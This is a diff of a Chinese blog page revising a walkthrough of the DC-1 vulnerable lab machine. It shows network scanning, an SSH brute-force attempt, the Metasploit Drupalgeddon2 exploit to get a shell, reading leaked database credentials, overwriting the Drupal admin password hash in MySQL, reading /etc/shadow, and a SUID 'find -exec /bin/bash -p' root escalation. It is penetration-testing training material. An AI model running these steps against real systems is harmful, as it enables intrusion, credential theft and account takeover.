@@ -20,17 +20,56 @@
     var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="1arp-scan -l 1nmap -A 192.168.130.137 1nmap --script&#x3D;ssh-brute 192.168.130.137 12msfconsolesearch Drupal 123use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.168.130.137run 12cdfind &#x2F; -name f">
+  <meta name="description" content="记录一下dc靶机系列的漏洞，本次学习的是DC-1，涉及的知识包括msf利用历史漏洞获取shell，mysql数据库更改密码，suid提权">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-1靶场复现">
+<meta property="og:title" content="DC-1靶机复现">
 <meta property="og:url" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="知鱼的Blog">
-<meta property="og:description" content="1arp-scan -l 1nmap -A 192.168.130.137 1nmap --script&#x3D;ssh-brute 192.168.130.137 12msfconsolesearch Drupal 123use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.168.130.137run 12cdfind &#x2F; -name f">
+<meta property="og:description" content="记录一下dc靶机系列的漏洞，本次学习的是DC-1，涉及的知识包括msf利用历史漏洞获取shell，mysql数据库更改密码，suid提权">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/15.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/16.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/18.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/19.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/22.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/20.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/23.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/21.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/25.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/26.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/27.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/28.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/29.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/30.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/31.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/36.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/32.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/37.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/33.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/38.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/34.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/35.png">
 <meta property="article:published_time" content="2025-05-30T08:45:45.000Z">
-<meta property="article:modified_time" content="2025-05-30T09:35:34.899Z">
+<meta property="article:modified_time" content="2025-06-02T02:25:36.097Z">
 <meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
 
 <link rel="canonical" href="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">
 
@@ -45,7 +84,7 @@
   };
 </script>
 
-  <title>DC-1靶场复现 | 知鱼的Blog</title>
+  <title>DC-1靶机复现 | 知鱼的Blog</title>
   
 
 
@@ -173,7 +212,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          DC-1靶场复现
+          DC-1靶机复现
         </h1>
 
         <div class="post-meta">
@@ -182,9 +221,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-05-30 16:45:45 / 修改时间：17:35:34" itemprop="dateCreated datePublished" datetime="2025-05-30T16:45:45+08:00">2025-05-30</time>
+              <time title="创建时间：2025-05-30 16:45:45" itemprop="dateCreated datePublished" datetime="2025-05-30T16:45:45+08:00">2025-05-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-02 10:25:36" itemprop="dateModified" datetime="2025-06-02T10:25:36+08:00">2025-06-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
             </span>
 
           
@@ -198,14 +252,110 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+        <p> 记录一下dc靶机系列的漏洞，本次学习的是DC-1，涉及的知识包括msf利用历史漏洞获取shell，mysql数据库更改密码，suid提权</p>
+<span id="more"></span>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先来查看一下dc-1靶机的mac地址：</p>
+<p><img src="1.png" alt="图片"></p>
+<p>arp扫描存在的主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="图片"></p>
+<p>目标靶机ip是：192.167.130.137，使用nmap扫描靶机存在的端口：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.130.137</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="图片"></p>
+<p>开放了22-ssh服务，80-http服务，以及111端口，可以尝试一下暴力破解ssh的账号密码</p>
 <figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ssh-brute 192.168.130.137</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="4.png" alt="图片"></p>
+<p>但结果是失败的，我们访问下80端口服务：</p>
+<p><img src="5.png" alt="图片"></p>
+<p>这里有<u>Request new password</u>，尝试重置密码，还是失败，但我们确认了存在一个用户名：admin</p>
+<p><img src="6.png" alt="图片"></p>
+<p><img src="7.png" alt="图片"></p>
+<p>然后发现该web页面是Drupal框架，也可以通过wappalyzer插件找到</p>
+<p><img src="8.png" alt="图片"></p>
+<p><img src="9.png" alt="图片"></p>
+<h2 id="msf获取shell"><a href="#msf获取shell" class="headerlink" title="msf获取shell"></a>msf获取shell</h2><p>既然我们已知该系统，那么我们可以通过msf查看下存在的历史漏洞</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="10.png" alt="图片"></p>
+<p>这里我们准备使用18年的漏洞drupal_drupalgeddon2，可以看下这个漏洞产生的原理</p>
+<p><img src="11.png" alt="图片"></p>
+<p><strong>call_user_func($a,$b)</strong>函数调用两个参数，参数a可以调用系统命令，而参数b就是命令的参数，而此函数并未对输入进行任何的过滤，所以就产生了漏洞，我们直接用msf打这个漏洞</p>
 <figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.130.137</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="12.png" alt="图片"></p>
+<p>拿到shell，接着查看有没有flag文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span></span><br><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="图片"></p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>有两个flag文件，flag1.txt和flag4.txt，查看下flag1的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/flag1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="图片"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>提到配置文件，那么我们就看下配置文件settings.php的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `find / -name settings.php`</span><br></pre></td></tr></table></figure>
+<p><img src="15.png" alt="图片"></p>
+<p>哦吼，这里的flag2的信息提示我们暴力破解和字典并非唯一进入web服务的方式，那就是必须用其他方法喽</p>
+<p>这里的数据库信息全部泄露了，那我们就连接一下，先切换到交互式shell：bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="16.png" alt="图片"></p>
+<h2 id="mysql修改密码"><a href="#mysql修改密码" class="headerlink" title="mysql修改密码"></a>mysql修改密码</h2><p>尝试连接上mysql</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="17.png" alt="图片"></p>
+<p>查看当前的数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure>
+<p><img src="18.png" alt="图片"></p>
+<p>第一个是默认的数据库（自带），所以我们使用第二个，查看里面的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>
+<p><img src="19.png" alt="图片"></p>
+<p><img src="22.png" alt="图片"></p>
+<p><img src="20.png" alt="图片"></p>
+<p>发现了两个有用的表：<strong>node</strong>和<strong>users</strong>，这里的node表是因为<strong>drupal node机制理解</strong>，在drupal中通过节点类控制整个页面内容，相关资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/amw863/p/4551889.html">https://www.cnblogs.com/amw863/p/4551889.html</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> node;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+<p><img src="23.png" alt="图片"></p>
+<p><img src="21.png" alt="图片"></p>
+<p>根据这里的uid判断出必须以admin登录才能拿到flag3，这里有admin的hash值，但是如果我们想硬破解的话，可以在cmd5上破解，但需要花钱，而且flag2提示不需要暴力破解，那我们换种思路，我们利用加密的脚本，生成admin的hash值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts<span class="operator">/</span>password<span class="operator">-</span>hash.sh admin</span><br></pre></td></tr></table></figure>
+<p><img src="25.png" alt="图片"></p>
+<p>把admin的密码更换成我们刚才生成的hash值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DTs7vLkSSZnJRBNX.kAsHHWW.MF4Izf0IH.gtkpdXOJo1922vTUD&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="26.png" alt="图片"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>我们登录web端：admin/admin，在content处发现flag3</p>
+<p><img src="27.png" alt="图片"></p>
+<p><img src="28.png" alt="图片"></p>
+<p><strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>提示需要使用find命令，执行exec获取shadow内容；我们看看刚才的flag4的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/flag4/flag4.txt</span><br></pre></td></tr></table></figure>
+<p><img src="29.png" alt="图片"></p>
+<p>提示说需要使用root权限才可以，那我们就需要提权了，先看下shadow和passwd的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="built_in">cat</span> etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="30.png" alt="图片"></p>
+<p><img src="31.png" alt="图片"></p>
+<p>shadow没权限，passwd发现flag4用户：<strong>x</strong>表示密码被保存在 <code>/etc/shadow</code> 文件中，而不是明文显示在这里；<strong>UID</strong>用来唯一标识用户的数字，0 是超级用户（<code>root</code>），大于 1000 的通常是普通用户；<strong>GID</strong>该用户所属的主组 ID，组信息可以在 <code>/etc/group</code> 文件中查找；<strong>GECOS</strong>通常是用户的备注信息；<strong>Home directory</strong>用户登录后的默认工作目录；<strong>Shell</strong>用户登录后使用的 shell 类型，例如 bash、sh、nologin 等，因为没有flag4密码，这里也无法切换到flag4用户</p>
+<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>SUID：Set User ID，SUID 是一种特殊的文件权限，当一个文件有 SUID 权限时，<strong>它会以该文件所有者的身份运行</strong>，而不是当前执行它的用户身份，例如，如果一个文件由 <code>root</code> 拥有并设置了 SUID，普通用户执行它时，该程序会以 root 权限运行</p>
+<p>我们先看下有suid权限的可提权的命令</p>
+<p><img src="36.png" alt="图片"></p>
+<p>继续执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">等价</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>各参数含义：<strong>-perm -u=s</strong>：查找“用户位”被设置了 SUID 的文件（即权限位中有 <code>s</code>）；<strong>-type f</strong>：限定为普通文件（非目录、设备等）；<strong>2&gt;/dev/null</strong>：2指的是“标准错误输出”，&gt;表示“重定向”，/dev/null是一个特殊的黑洞设备，所有写入它的内容都会被丢弃</p>
+<p><img src="32.png" alt="图片"></p>
+<p>里面有<code>/usr/bin/find</code>，我们看下该文件所属用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /usr/bin/find</span><br><span class="line">或者使用</span><br><span class="line">/usr/bin/find /tmp -<span class="built_in">exec</span> <span class="built_in">whoami</span>  \;</span><br></pre></td></tr></table></figure>
+<p><img src="37.png" alt="图片"></p>
+<p><img src="33.png" alt="图片"></p>
+<p>可见文件所属用户，所属组都是root，下面开始提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="38.png" alt="图片"></p>
+<p><strong><code>find</code> 是 SUID 的</strong>（以 root 身份运行），<code>-exec</code> 执行的命令也就以 root 身份运行，<code>bash -p</code> 启动后<strong>不会降权</strong>，所以拿到了 root shell</p>
+<p><img src="34.png" alt="图片"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>查找最终的flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br><span class="line"><span class="built_in">cat</span> /root/thefinal.txt</span><br></pre></td></tr></table></figure>
+<p><img src="35.png" alt="图片"></p>
+<p>本次渗透就到此结束了！！！</p>
+<div class="note info">
+            <p>在msf上显示这个框架有很多历史漏洞，这里也只使用了一个，使用其他的也能拿到shell</p>
+          </div>
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/14038071.html">https://www.cnblogs.com/Lmg66/p/14038071.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/defense/376418.html">https://www.freebuf.com/defense/376418.html</a></p>
+<blockquote>
+<p><strong>少年自有凌云志，不惧人间万尺冰</strong></p>
+</blockquote>
 
     </div>
 
@@ -221,7 +371,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" title="DC-1靶场复现">http://zh1yu.xyz/2025/05/30/DC-1靶场复现/</a>
+    <a href="http://zh1yu.xyz/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" title="DC-1靶机复现">http://zh1yu.xyz/2025/05/30/DC-1靶场复现/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -231,6 +381,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+          </div>
 
         
 
@@ -300,6 +453,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf%E8%8E%B7%E5%8F%96shell"><span class="nav-number">2.</span> <span class="nav-text">msf获取shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1"><span class="nav-number">2.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2"><span class="nav-number">2.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">mysql修改密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3"><span class="nav-number">3.1.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag4"><span class="nav-number">3.2.</span> <span class="nav-text">flag4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag5"><span class="nav-number">4.1.</span> <span class="nav-text">flag5</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
